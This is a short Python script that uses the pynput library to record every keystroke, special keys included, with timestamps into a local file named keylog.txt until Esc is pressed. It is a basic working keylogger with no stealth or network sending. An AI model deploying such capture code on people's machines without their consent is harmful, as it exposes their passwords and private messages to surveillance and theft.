from pynput import keyboard
import logging

# Set up logging to file
logging.basicConfig(filename=("keylog.txt"),
                    level=logging.DEBUG,
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the character of the key
        logging.info(f'Key {key.char} pressed')
    except AttributeError:
        # Log special keys (e.g., Shift, Ctrl)
        logging.info(f'Special Key {key} pressed')

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
